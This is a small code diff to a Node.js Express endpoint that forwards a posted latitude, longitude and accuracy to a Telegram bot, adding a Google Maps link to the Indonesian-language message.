@@ -21,7 +21,8 @@ app.post("/location", async (req, res) => {
     const text = `📍 Lokasi:
 Lat: ${lat}
 Lon: ${lon}
-Akurasi: ${acc}`;
+Lokasi: https://www.google.com/maps/search/?api=1&query=${lat},${lon}
+Akurasi: ${acc}%`;
 
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: "POST",
